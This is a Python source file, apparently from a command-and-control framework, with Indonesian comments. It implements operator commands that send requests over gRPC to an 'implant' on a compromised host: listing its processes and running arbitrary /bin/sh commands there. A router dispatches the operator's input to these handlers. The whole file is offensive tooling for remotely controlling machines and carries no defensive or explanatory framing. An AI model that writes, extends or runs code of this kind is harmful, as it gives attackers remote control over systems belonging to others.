
import smf
import grpc

from data.registry.c2cmd import C2_COMMANDS
from internal.proto.rpc import services_pb

# --- KUMPULAN FUNGSI PERINTAH ---
def cmd_ps(session_id, args, rpc_client):
    req = services_pb.GenericPayloadReq(SessionID=session_id)
    res = rpc_client.GetProcessList(req)
    smf.printf(res.Output)

def cmd_shell(session_id, args, rpc_client):
    if not args:
        smf.printf("Usage: shell <command>")
        return
        
    shell_req = services_pb.ShellReq(SessionID=session_id, Path="/bin/sh", Args=args)
    res = rpc_client.ExecuteShell(shell_req)
    if res.Stderr:
        smf.printd("Shell Error", res.Stderr, level="ERROR")
    smf.printf(res.Stdout)

# --- ROUTER DINAMIS ---
def _route_command_to_implant(session_id, c2_input, rpc_client):
    parts = c2_input.split()
    cmd = parts[0].lower()
    args = parts[1:]

    handler = C2_COMMANDS.get(cmd)
    
    if handler:
        try:
            handler(session_id, args, rpc_client)
        except grpc.RpcError as e:
            smf.printd(f"Command '{cmd}' transmission failed", e.details(), level="ERROR")
    else:
        smf.printf(f"[-] Command '{cmd}' not found. Type 'help' for available commands.")
      
